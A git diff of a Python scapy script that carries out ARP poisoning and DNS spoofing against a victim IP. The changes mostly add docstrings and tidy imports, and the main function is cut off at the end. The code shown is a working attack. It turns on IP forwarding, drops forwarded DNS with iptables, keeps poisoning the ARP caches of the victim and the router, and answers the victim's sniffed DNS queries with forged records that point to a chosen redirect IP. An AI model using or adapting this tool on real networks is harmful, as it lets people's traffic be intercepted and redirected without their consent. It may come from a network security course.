@@ -1,14 +1,17 @@
 #!/usr/bin/python3
 
-import subprocess, os, re
+import subprocess, os
 import threading
-import signal
 from scapy.all import *
 import argparse
 
-
 redirectIP = ""
 
+"""
+Get user input through command-line arguments.
+
+:return the list of command-line arguments.
+"""
 def parse_args():
     parser = argparse.ArgumentParser()
     parser.add_argument("-v", "--victim", help="IP address of victim", required=True)
@@ -17,17 +20,26 @@ def parse_args():
     parser.add_argument("-re", "--redirect", help="IP address of where victim will be directed to. ")
     return parser.parse_args()
 
+"""
+Check if the user is a root user. If not, print out a message and exit.
+"""
 def checkRootPrivilege():
     if os.geteuid() != 0:
         sys.exit("[!] Please run the script as root.")
 
+"""
+Enable IP forwarding and set a firewall rule to drop any DNS request.
+"""
 def setup():
-    # Disable fowarding of DNS request to router
+    # Enable fowarding of DNS request to router
     with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
         ipf.write('1\n')
     # Add iptables rule to drop any DNS request
     subprocess.Popen(["iptables -A FORWARD -p UDP --dport 53 -j DROP"], shell=True, stdout=subprocess.PIPE)
 
+"""
+Disable IP forwarding and remove the firewall rule to drop any DNS request.
+"""
 def restore():
     with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
         ipf.write('0\n')
@@ -35,6 +47,12 @@ def restore():
     subprocess.Popen(["iptables -D FORWARD -p UDP --dport 53 -j DROP"], shell=True, stdout=subprocess.PIPE,)
     print("Exiting...")
 
+"""
+Get the local machine MAC address from the given interface
+
+:param interface: ethernet interface
+:return the MAC address
+"""
 def getLocalMAC(interface):
     mac = ""
     try:
@@ -43,11 +61,25 @@ def getLocalMAC(interface):
         mac = "00:00:00:00:00:00"
     return mac[:17]
 
+"""
+Get the MAC address from the given IP.
+
+:param IP: the IP to extract MAC address
+:return the MAC address of the given IP
+"""
 def getTargetMAC(IP):
     ans, unans = arping(IP, verbose=0)
     for s,r in ans:
         return r[Ether].src
 
+"""
+ARP poisoning for both victim machine and the router.
+
+:param routerIP: IP address of the router
+:param victimIP: IP address of the victim machine
+:param routerMAC: MAC address of the router
+:param victimMAC: MAC address of the victim machine
+"""
 def arpPoison(routerIP, victimIP, routerMAC, victimMAC):
     print("Starting ARP poisoning to {}".format(victimIP))
     while True:
@@ -55,6 +87,11 @@ def arpPoison(routerIP, victimIP, routerMAC, victimMAC):
         send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC), verbose=0)
         send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC), verbose=0)
 
+"""
+Craft a DNS response and send it back.
+
+:param packet: sniffed DNS packet
+"""
 def parsePacket(packet):
     global redirectIP
     if packet.haslayer(DNS) and DNSQR in packet:
@@ -64,10 +101,23 @@ def parsePacket(packet):
                     an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=redirectIP)))
         send(response, verbose=0)
 
+"""
+Sniffing traffic for DNS request with the source IP is the victim IP.
+
+:param victimIP: IP address of the victim machine
+"""
 def listen(victimIP):
     mFilter = "udp and port 53 and src " + victimIP
     sniff(filter=mFilter, prn=parsePacket)
 
+"""
+The main function of the application. Get the user input from the argument parser.
+Perform initial check to see if the victim will be forward to the attacker machine
+or the another machine. After that, ARP poisoning and reply to any DNS request from
+the victim machine.
+
+:param args: command-line arguments from the user
+"""
 def main(args):
     global redirectIP
     checkRootPrivilege()
